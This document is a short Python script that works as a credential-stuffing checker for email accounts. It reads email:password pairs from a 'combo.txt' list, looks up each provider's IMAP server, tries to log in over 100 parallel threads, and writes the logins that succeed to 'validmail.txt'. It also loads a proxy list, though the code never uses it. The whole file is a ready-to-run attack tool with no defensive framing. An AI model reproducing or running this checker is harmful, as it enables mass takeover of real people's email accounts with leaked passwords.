import imaplib
import threading
import queue
from raducord import Logger

def load_imap_settings(filename='prov.txt'):
    imap_settings = {}
    with open(filename, 'r') as f:
        for line in f:
            parts = line.strip().split(':')
            if len(parts) == 3:
                domain, server, port = parts
                imap_settings[domain] = (server, port)
    return imap_settings

def load_combos(filename='combo.txt'):
    with open(filename, 'r') as f:
        combos = [line.strip() for line in f if ':' in line]
    return combos

def load_proxies(filename='proxies.txt'):
    with open(filename, 'r') as f:
        proxies = [line.strip() for line in f]
    return proxies

def check_email(combo, imap_settings):
    email, password = combo.split(':')
    domain = email.split('@')[-1]
    if domain not in imap_settings:
        Logger.failed(f"{email},{password},INVALID")
        return
    
    server, port = imap_settings[domain]
    try:
        mail = imaplib.IMAP4_SSL(server, port)
        mail.login(email, password)
        Logger.success(f"{email},{password},VALID")
        with open('validmail.txt', 'a') as f:
            f.write(f"{email}:{password}\n")
    except:
        Logger.failed(f"{email},{password},INVALID")

def worker(imap_settings, combos):
    while not combos.empty():
        combo = combos.get()
        check_email(combo, imap_settings)
        combos.task_done()

def main():
    imap_settings = load_imap_settings()
    combos = load_combos()
    proxies = load_proxies()

    combo_queue = queue.Queue()

    for combo in combos:
        combo_queue.put(combo)

    threads = []
    for _ in range(100):
        thread = threading.Thread(target=worker, args=(imap_settings, combo_queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
